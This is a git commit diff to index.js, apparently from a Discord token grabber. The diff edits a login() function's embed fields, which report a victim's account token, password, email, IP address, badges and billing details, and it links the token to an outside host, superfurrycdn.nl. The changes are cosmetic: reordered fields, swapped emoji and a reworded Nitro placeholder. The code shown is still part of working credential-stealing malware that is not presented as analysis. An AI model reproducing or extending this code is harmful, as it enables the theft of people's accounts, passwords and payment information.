363fa59bafa6ad03badc397648b6f39c9756401f
oxyidz <107583994+oxyidz@users.noreply.github.com>
2022-06-20 20:07:38 +0200

    Update index.js

--- index.js
+++ index.js
@@ -583,37 +583,37 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:9382blueheart:985665072187707452> @SN - Token:',
-            value: `\`\`\`${token}\`\`\`[Click to copy](https://superfurrycdn.nl/copy/${token})`,
+            name: '<a:944007295417843743:959785231982931979> @SN - Token:',
+            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
             inline: false,
           },
           {
-            name: '<:1205bluepawprints:985668463899050014> @SN - Badges:',
+            name: '<a:satanist:802503618972483615> @SN - Badges:',
             value: `${badges}`,
             inline: true,
           },
           {
+            name: '<:944007233820307467:959785232037470208> @SN - Billing:',
+            value: `**${billing}**`,
+            inline: true,
+          },
+          {
             name: '<:944007233820307467:959785232037470208> @SN - Nitro:',
-            value: `*In development*`,
+            value: `*soon..*`,
             inline: true,
           },
           {
-            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing:',
-            value: `${billing}`,
-            inline: true,
-          },
-          {
-            name: '<a:9574_Butterfly_Blue:985666963089014805> @SN - Email:',
+            name: '<:944007233820307467:959785232037470208> @SN - Email:',
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: '<a:5211fireemojis:985667589961318430> @SN - IP:',
+            name: '<:944007233820307467:959785232037470208> @SN - IP:',
             value: `\`${config.ip}\``,
             inline: true,
           },
           {
-            name: '<a:4536gun4:985673435860586557> @SN - Password:',
+            name: '<a:satan:846706207632261120> @SN - Password:',
             value: `\`${password}\``,
             inline: true,
           },
